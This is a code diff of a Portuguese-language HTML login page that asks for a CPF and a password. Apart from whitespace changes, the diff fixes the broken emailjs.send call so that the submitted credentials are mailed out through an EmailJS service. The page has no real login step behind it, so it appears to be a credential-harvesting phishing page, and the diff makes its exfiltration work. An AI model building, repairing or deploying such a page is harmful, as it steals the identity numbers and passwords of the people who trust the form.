@@ -7,19 +7,16 @@
     <title>Login</title>
 </head>
 <body>
-    <img src="new-logo-white.svg" alt="Logo">
-    
+    <img src="new-logo-white.svg" alt="Logo"> 
+
     <form id="login-form">
         <b><p>Faça Seu Login</p></b>
-        
         <label for="cpf">CPF
             <input type="text" name="cpf" id="cpf" required>
         </label>
-        
         <label for="password">SENHA
             <input type="password" name="password" id="password" required>
         </label>
-        
         <button type="submit">Enviar</button>
     </form>
 
@@ -37,7 +34,7 @@
             event.preventDefault(); // Evita o envio normal do formulário
 
             // Envia o formulário para o EmailJS
-            emailjs.send("service_q4yc9r6","template_ug4bg1d"), this)
+            emailjs.send("service_q4yc9r6", "template_ug4bg1d", this)
                 .then(function(response) {
                     // Sucesso
                     alert("Mensagem enviada com sucesso!");
@@ -49,9 +46,9 @@
                 });
         });
     </script>
-
 </body>
 </html>
+
 
 
 
